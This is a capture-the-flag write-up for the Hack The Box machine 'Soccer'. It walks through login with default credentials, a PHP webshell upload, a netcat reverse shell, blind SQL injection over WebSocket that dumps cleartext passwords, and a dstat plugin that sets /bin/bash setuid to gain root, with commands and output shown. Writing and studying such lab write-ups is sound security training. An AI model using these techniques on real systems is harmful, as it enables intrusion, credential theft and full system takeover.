# Soccer

---

## Enumeration & Foothold

- nmap TCP scan:

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
```

- Web server on port 80 reveals its domain name by redirecting to `soccer.htb`
- Gobuster dir scan revealed `/tiny/` path which is a file manager
- Default credentials worked to log in as admin `admin:admin@123`
- To get a foothold I uploaded a PHP webshell to `/tiny/uploads/shell.php` using the tiny file manager then executed a revshell payload


```bash
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.77] from (UNKNOWN) [10.129.113.252] 41590
bash: cannot set terminal process group (975): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:~/html/tiny/uploads$ which python3
which python3
/usr/bin/python3
www-data@soccer:~/html/tiny/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@soccer:~/html/tiny/uploads$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg                  
[1]  + continued  nc -lvnp 9001

www-data@soccer:~/html/tiny/uploads$ export TERM=xterm
www-data@soccer:~/html/tiny/uploads$ stty rows 39 cols 157
www-data@soccer:~/html/tiny/uploads$ 
```

---

## Lateral Movement

- The reverse shell is now as `www-data`
- Found a subdomain in `/etc/hosts`:

```
www-data@soccer:/home$ cat /etc/hosts
127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb

127.0.1.1       ubuntu-focal    ubuntu-focal
```

- `soc-player.soccer.htb` Sends WebSocket requests on ticket validation
- WebSocket is vulnerable to blind sql injection, used [this script](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) with sqlmap to dump the database
- After enumerating the database, found db `soccer_db` and table `accounts`, dumped it and got `player` creds
- `Player`'s creds was in clear text: `Player:PlayerOftheMatch2022`

```
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

- This is also player's password on the target machine, `su player` and got user.txt

---

## PrivEsc

- Found an interesting setuid binary

```bash
player@soccer:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas

player@soccer:/usr/local/bin$ ls -la doas
-rwsr-xr-x 1 root root 42224 Nov 17 09:09 doas
```

- After checking the man page, found the config file for `doas`:

```bash
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat

doas -u root /usr/bin/dstat --list
internal:
        aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,page24,proc,
        raw,socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones
/usr/share/dstat:
        battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,dstat-cpu,
        dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs,gpfs-ops,helloworld,ib,innodb-buffer,innodb-io,innodb-ops,jvm-full,jvm-vm,lustre,
        md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats,mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,
        mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,net-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops,
        nfsstat4,ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,sendmail,snmp-cpu,snmp-load,snmp-mem,snmp-net,snmp-net-err,snmp-sys,
        snooze,squid,test,thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime,top-cputime-avg,top-int,top-io,top-io-adv,
        top-latency,top-latency-avg,top-mem,top-oom,utmp,vm-cpu,vm-mem,vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,
        zfs-l2arc,zfs-zil
```

- I wrote a custom plugin, a simple python script that I can execute as root, it simply executes `chmod +s /bin/bash` and it worked.

```bash
player@soccer:/usr/local/share/dstat$ cp /tmp/games/dstat_poc.py .
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --list

...

/usr/local/share/dstat:
        poc

player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --poc
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
Module dstat_poc failed to load. (name 'dstat_plugin' is not defined)
None of the stats you selected are available.'

player@soccer:/usr/local/share/dstat$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
player@soccer:/usr/local/share/dstat$ bash -p
bash-5.0# whoami
root
bash-5.0# 
```

---
